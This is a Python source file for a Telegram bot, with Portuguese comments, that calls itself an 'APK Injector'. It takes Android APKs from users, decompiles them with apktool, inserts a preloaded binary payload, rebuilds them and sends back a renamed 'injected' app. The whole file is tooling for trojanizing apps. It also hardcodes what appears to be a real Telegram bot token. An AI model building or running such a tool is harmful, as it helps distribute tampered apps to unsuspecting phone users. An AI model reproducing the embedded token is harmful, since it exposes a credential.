import os
import base64
import logging
import tempfile
import subprocess
from pathlib import Path
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN", "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A").strip()

# ============================================
# CARREGAR PAYLOAD
# ============================================
PAYLOAD = None

try:
    payload_paths = [
        "/app/payload_data.bin",
        "./payload_data.bin",
        os.path.join(os.path.dirname(__file__), "payload_data.bin"),
    ]

    for path in payload_paths:
        if os.path.exists(path):
            size = os.path.getsize(path)
            if size > 0:
                with open(path, "rb") as f:
                    PAYLOAD = f.read()
                logger.info(f"✅ Payload carregado: {len(PAYLOAD)} bytes ({len(PAYLOAD)//(1024*1024)} MB)")
                break
            else:
                logger.warning(f"⚠️ Arquivo vazio: {path}")

    if not PAYLOAD:
        logger.error("❌ Payload não encontrado")

except Exception as e:
    logger.error(f"❌ Erro ao carregar payload: {e}")

# ============================================
# FUNÇÃO PARA INJETAR PAYLOAD
# ============================================
def inject_payload(apk_bytes):
    """Injeta o payload no APK"""
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir = Path(tmpdir)
            input_apk = tmpdir / "input.apk"
            output_apk = tmpdir / "output.apk"
            
            with open(input_apk, "wb") as f:
                f.write(apk_bytes)
            
            logger.info("📦 Decompilando APK...")
            result = subprocess.run(
                ["apktool", "d", "-f", "-o", str(tmpdir / "decompiled"), str(input_apk)],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                logger.error(f"Erro ao decompilar: {result.stderr}")
                return None
            
            # Copiar payload para a pasta decompilada
            payload_path = Path(tmpdir) / "decompiled" / "payload.bin"
            with open(payload_path, "wb") as f:
                f.write(PAYLOAD)
            logger.info(f"✅ Payload copiado para: {payload_path}")
            
            logger.info("📦 Recompilando APK...")
            result = subprocess.run(
                ["apktool", "b", "-o", str(output_apk), str(tmpdir / "decompiled")],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                logger.error(f"Erro ao recompilar: {result.stderr}")
                return None
            
            if output_apk.exists():
                with open(output_apk, "rb") as f:
                    return f.read()
            
            return None
            
    except Exception as e:
        logger.error(f"❌ Erro ao injetar payload: {e}")
        return None

# ============================================
# COMANDOS DO BOT
# ============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot APK Injector\n\n"
        "Envie um APK e eu vou injetar o payload!\n\n"
        "Comandos:\n"
        "/status - Verificar payload\n"
        "/help - Ajuda"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if PAYLOAD:
        mb = len(PAYLOAD) // (1024 * 1024)
        await update.message.reply_text(f"✅ Payload carregado: {mb} MB")
    else:
        await update.message.reply_text("❌ Sem payload carregado!")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 Ajuda:\n\n"
        "/start - Mensagem inicial\n"
        "/status - Verificar payload\n"
        "/help - Esta mensagem\n\n"
        "📤 Envie um APK para injetar o payload."
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Processa o APK recebido"""
    if not PAYLOAD:
        await update.message.reply_text("❌ Payload não está carregado!")
        return
    
    document = update.message.document
    if not document or not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Por favor, envie um arquivo APK válido!")
        return
    
    await update.message.reply_text("📥 Baixando APK...")
    
    try:
        # Baixar o APK
        file = await context.bot.get_file(document.file_id)
        apk_data = await file.download_as_bytearray()
        
        await update.message.reply_text("🔧 Injetando payload... (pode levar alguns minutos)")
        
        # Injeta o payload
        result = inject_payload(bytes(apk_data))
        
        if result:
            await update.message.reply_document(
                document=result,
                filename=f"injetado_{document.file_name}",
                caption="✅ APK injetado com sucesso!"
            )
        else:
            await update.message.reply_text("❌ Erro ao injetar payload!")
            
    except Exception as e:
        logger.error(f"❌ Erro: {e}")
        await update.message.reply_text(f"❌ Erro: {str(e)}")

# ============================================
# MAIN
# ============================================

def main():
    if not TOKEN:
        raise ValueError("❌ TELEGRAM_TOKEN não configurado!")

    logger.info(f"✅ Token OK: {TOKEN[:10]}...")

    app = Application.builder().token(TOKEN).build()
    
    # Comandos
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    
    # Handler para APK
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    
    logger.info("✅ Bot rodando! Aguardando mensagens...")
    app.run_polling()

if __name__ == "__main__":
    main()